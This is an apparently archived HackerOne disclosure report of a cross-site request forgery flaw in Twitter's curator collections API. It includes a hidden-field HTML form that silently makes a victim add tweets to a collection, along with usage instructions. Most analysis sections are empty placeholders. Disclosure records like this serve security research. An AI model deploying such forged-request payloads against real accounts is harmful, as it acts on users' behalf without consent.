# Add tweet to collection CSRF 

## Metadata
- **Source:** HackerOne
- **Report:** 100820 | https://hackerone.com/reports/100820
- **Submitted:** 2015-11-21
- **Reporter:** indoappsec
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
Hi Team,

I have found a CSRF vulnerability which force victim to add tweets in his collection.

HTML POC : 

<html>
<body>
<form action="https://curator.twitter.com/api/collections/STREAM/content" method="POST">
<input type="hidden" name="tweet_ids[]" value="667977435124658176">
<input type="hidden" name="collections[]" value="667916850294951936">
<input type="hidden" name="model[id]" value="STRE

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi Team,

I have found a CSRF vulnerability which force victim to add tweets in his collection.

HTML POC : 

<html>
<body>
<form action="https://curator.twitter.com/api/collections/STREAM/content" method="POST">
<input type="hidden" name="tweet_ids[]" value="667977435124658176">
<input type="hidden" name="collections[]" value="667916850294951936">
<input type="hidden" name="model[id]" value="STREAM">
<input type=submit>
</body>
</html>

Before using this POC change the Collection ID to your collection ID and you will see that tweet will be added into your collection.You can Also add so many tweets in one request by adding "tweet_ids" parameter multiple times.

Let me know if you need any other help from my side.

Best Regards !
Vijay Kumar 

</details>

---
*Analysed by Claude on 2026-05-24*
